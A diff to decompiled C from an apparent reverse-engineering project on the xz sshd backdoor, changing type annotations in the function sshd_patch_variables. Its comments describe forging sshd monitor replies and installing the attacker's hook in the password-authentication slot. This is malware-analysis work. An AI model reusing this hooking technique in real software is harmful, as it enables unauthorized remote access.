@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/107D50_sshd_patch_variables.c
 // Function: sshd_patch_variables @ 0x107D50
 // Calling convention: __stdcall
-// Prototype: BOOL __stdcall sshd_patch_variables(BOOL skip_root_patch, BOOL disable_pam, BOOL replace_monitor_reqtype, int monitor_reqtype, global_context_t * global_ctx)
+// Prototype: BOOL __stdcall sshd_patch_variables(BOOL skip_root_patch, BOOL disable_pam, BOOL replace_monitor_reqtype, monitor_reqtype_t monitor_reqtype, global_context_t * global_ctx)
 
 
 /*
@@ -15,7 +15,7 @@
 
 BOOL sshd_patch_variables
                (BOOL skip_root_patch,BOOL disable_pam,BOOL replace_monitor_reqtype,
-               int monitor_reqtype,global_context_t *global_ctx)
+               monitor_reqtype_t monitor_reqtype,global_context_t *global_ctx)
 
 {
   int current_permit_root;
@@ -61,7 +61,7 @@ BOOL sshd_patch_variables
   }
   // AutoDoc: Derive the request ID from sshd's live dispatch table so forged replies stay in sync with the monitor state machine.
   if (replace_monitor_reqtype == FALSE) {
-    monitor_reqtype = *(int *)(sshd_ctx->mm_answer_authpassword_slot + -1) + 1;
+    monitor_reqtype = *(int *)(sshd_ctx->mm_answer_authpassword_slot + -1) + MONITOR_ANS_MODULI;
   }
   sshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;
   // AutoDoc: Finally drop the attacker's hook into the genuine slot once every optional tweak is satisfied.
